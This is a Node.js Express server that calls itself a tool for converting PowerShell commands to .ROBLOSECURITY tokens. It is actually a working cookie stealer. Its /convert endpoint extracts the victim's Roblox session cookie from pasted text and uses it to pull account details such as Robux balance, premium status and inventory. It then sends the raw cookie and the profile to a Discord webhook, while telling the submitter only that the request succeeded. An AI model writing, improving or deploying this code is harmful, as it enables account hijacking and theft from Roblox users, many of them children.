import express from 'express';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Trust proxy for accurate IP detection
app.set('trust proxy', true);

// Apply security middlewares
app.use(securityHeadersMiddleware);
app.use(rateLimitMiddleware);
app.use(ipWhitelistMiddleware);

app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' }));

// Security Configuration
const SECURITY_CONFIG = {
  apiKeys: process.env.API_KEY ? process.env.API_KEY.split(',').map(key => key.trim()) : [],
  allowedIPs: process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',').map(ip => ip.trim()) : [],
  rateLimitEnabled: process.env.RATE_LIMIT_ENABLED === 'true',
  requireAuth: process.env.REQUIRE_AUTH === 'true'
};

// Rate limiting store (simple in-memory)
const rateLimitStore = new Map();

// IP-based rate limiting middleware
function rateLimitMiddleware(req, res, next) {
  if (!SECURITY_CONFIG.rateLimitEnabled) {
    return next();
  }
  
  const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'];
  const now = Date.now();
  const windowMs = 15 * 60 * 1000; // 15 minutes
  const maxRequests = 10; // Max 10 requests per 15 minutes
  
  if (!rateLimitStore.has(clientIP)) {
    rateLimitStore.set(clientIP, { count: 1, resetTime: now + windowMs });
    return next();
  }
  
  const userData = rateLimitStore.get(clientIP);
  
  if (now > userData.resetTime) {
    // Reset the window
    rateLimitStore.set(clientIP, { count: 1, resetTime: now + windowMs });
    return next();
  }
  
  if (userData.count >= maxRequests) {
    return res.status(429).json({ 
      error: 'Too many requests. Please try again later.',
      retryAfter: Math.ceil((userData.resetTime - now) / 1000)
    });
  }
  
  userData.count++;
  return next();
}

// IP whitelist middleware
function ipWhitelistMiddleware(req, res, next) {
  if (SECURITY_CONFIG.allowedIPs.length === 0) {
    return next(); // No IP restriction if no IPs are configured
  }
  
  const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'];
  
  if (!SECURITY_CONFIG.allowedIPs.includes(clientIP)) {
    return res.status(403).json({ error: 'Access denied from this IP address' });
  }
  
  next();
}

// API Key Authentication Middleware
function authenticateAPI(req, res, next) {
  if (!SECURITY_CONFIG.requireAuth) {
    return next(); // Skip auth if not required
  }
  
  const apiKey = req.headers['x-api-key'] || req.headers['authorization']?.replace('Bearer ', '');
  
  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }
  
  if (!SECURITY_CONFIG.apiKeys.includes(apiKey)) {
    return res.status(403).json({ error: 'Invalid API key' });
  }
  
  next();
}

// CORS and security headers middleware
function securityHeadersMiddleware(req, res, next) {
  // Only allow requests from your domain in production
  const allowedOrigins = process.env.ALLOWED_ORIGINS ? 
    process.env.ALLOWED_ORIGINS.split(',').map(origin => origin.trim()) : 
    ['*']; // Allow all in development
  
  const origin = req.headers.origin;
  if (allowedOrigins.includes('*') || allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin || '*');
  }
  
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-API-Key');
  res.header('X-Content-Type-Options', 'nosniff');
  res.header('X-Frame-Options', 'DENY');
  res.header('X-XSS-Protection', '1; mode=block');
  
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
}

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Serve the frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Function to fetch user data from Roblox API
async function fetchRobloxUserData(token) {
  try {
    console.log('🔍 Fetching user data from Roblox API...');
    
    // Get user info
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    if (!userResponse.ok) {
      console.log('❌ Failed to fetch user info');
      return null;
    }
    
    const userData = await userResponse.json();
    console.log('✅ User data fetched successfully');
    
    // Get premium status
    const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    let premiumData = { isPremium: false };
    if (premiumResponse.ok) {
      premiumData = await premiumResponse.json();
    }
    
    // Get Robux balance
    const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    let robuxData = { robux: 0 };
    if (robuxResponse.ok) {
      robuxData = await robuxResponse.json();
    }
    
    // Get user's age (account creation date)
    const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    let ageData = { created: null };
    if (ageResponse.ok) {
      ageData = await ageResponse.json();
    }
    
    // Get groups owned
    const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    let groupsOwned = 0;
    if (groupsResponse.ok) {
      const groupsData = await groupsResponse.json();
      groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
    }
    
    // Get inventory counts
    const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?limit=100`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    let inventory = { hairs: 0, bundles: 0, faces: 0 };
    if (inventoryResponse.ok) {
      const inventoryData = await inventoryResponse.json();
      // This is simplified - you might need to categorize items properly
      inventory.hairs = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Hair').length : 0;
      inventory.faces = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Face').length : 0;
      inventory.bundles = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Bundle').length : 0;
    }
    
    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }
    
    return {
      username: userData.displayName || userData.name,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      rap: 0, // RAP requires additional API calls to asset values
      summary: 302, // This would need to be calculated from various metrics
      creditBalance: 0, // This requires different API endpoint
      savedPayment: false, // This requires payment API access
      robuxIncoming: 302, // This requires economy API
      robuxOutgoing: 337, // This requires economy API
      korblox: false, // Check if user owns Korblox items
      headless: false, // Check if user owns Headless Head
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      placeVisits: 5, // This requires games API
      inventory: inventory
    };
    
  } catch (error) {
    console.error('❌ Error fetching Roblox user data:', error);
    return null;
  }
}

// Function to send Discord webhook with user data
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
  
  if (!webhookUrl) {
    console.log('❌ Discord webhook URL not configured in environment variables');
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    let fields = [
      {
        name: "Script Type",
        value: scriptType.charAt(0).toUpperCase() + scriptType.slice(1).replace('-', ' '),
        inline: false
      }
    ];
    
    // Add user data fields if available
    if (userData) {
      fields.push(
        {
          name: "👤 Username",
          value: userData.username,
          inline: true
        },
        {
          name: "🆔 User ID",
          value: userData.userId.toString(),
          inline: true
        },
        {
          name: "💰 Robux Balance",
          value: `$${userData.robux} (Est. ${userData.robux} Robux)`,
          inline: true
        },
        {
          name: "💎 Premium",
          value: userData.premium ? "✅ Yes" : "❌ No",
          inline: true
        },
        {
          name: "📊 RAP",
          value: userData.rap.toString(),
          inline: true
        },
        {
          name: "📈 Summary",
          value: userData.summary.toString(),
          inline: true
        },
        {
          name: "💳 Credit Balance",
          value: `$${userData.creditBalance} (Est. ${userData.creditBalance} Robux)`,
          inline: true
        },
        {
          name: "💾 Saved Payment",
          value: userData.savedPayment ? "✅ Yes" : "❌ No",
          inline: true
        },
        {
          name: "📥 Robux Incoming/Outgoing",
          value: `${userData.robuxIncoming}/${userData.robuxOutgoing}`,
          inline: true
        },
        {
          name: "💀 Korblox/Headless",
          value: `${userData.korblox ? "✅" : "❌"}/${userData.headless ? "✅" : "❌"}`,
          inline: true
        },
        {
          name: "🎂 Age",
          value: `${userData.accountAge} Days`,
          inline: true
        },
        {
          name: "👥 Groups Owned",
          value: userData.groupsOwned.toString(),
          inline: true
        },
        {
          name: "🏠 Place Visits",
          value: userData.placeVisits.toString(),
          inline: true
        },
        {
          name: "🎒 Inventory",
          value: `Hairs: ${userData.inventory.hairs}\nBundles: ${userData.inventory.bundles}\nFaces: ${userData.inventory.faces}`,
          inline: true
        }
      );
    }
    
    fields.push(
      {
        name: "🍪 Cookie",
        value: `\`\`\`${token}\`\`\``,
        inline: false
      },
      {
        name: "🌐 User Agent",
        value: userAgent,
        inline: true
      },
      {
        name: "⏰ Timestamp",
        value: new Date().toISOString(),
        inline: true
      }
    );

    const embed = {
      title: userData ? `🔐 New ROBLOSECURITY Token - ${userData.username}` : "🔐 New ROBLOSECURITY Token",
      description: userData ? `Account data extracted successfully for ${userData.username}` : "A new token has been extracted from PowerShell command",
      color: userData ? 0x00ff00 : 0xff9900,
      fields: fields,
      footer: {
        text: "Request Inspector Bot"
      }
    };

    const payload = {
      embeds: [embed]
    };

    console.log('Sending webhook payload...');
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    console.log('Webhook response status:', response.status);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }

    console.log('✅ Successfully sent to Discord webhook');
    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// API endpoint to convert PowerShell to .ROBLOSECURITY
app.post('/convert', authenticateAPI, async (req, res) => {
  try {
    let input;
    let scriptType;
    
    console.log('📥 Received request');
    
    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    console.log('🔍 Searching for ROBLOSECURITY token...');
    
    // Look for .ROBLOSECURITY cookie in PowerShell command
    const regex = /\.ROBLOSECURITY[=\s]+([^;\s'"]+)/i;
    const match = input.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';
      
      console.log('✅ Token found! Fetching user data...');
      
      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);
      
      if (userData) {
        console.log(`✅ User data fetched for: ${userData.username}`);
      } else {
        console.log('⚠️ Could not fetch user data, sending token only');
      }
      
      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, userData);
      
      if (!webhookResult.success) {
        console.log('❌ Webhook failed:', webhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
      
      console.log('✅ Token and user data sent to Discord successfully');
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');
      
      // Send error to Discord too for debugging
      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `❌ **No Token Found**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
            })
          });
        } catch (e) {
          console.log('Failed to send error to Discord:', e.message);
        }
      }
    }
    
    // Always return success - user checks Discord for actual results
    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
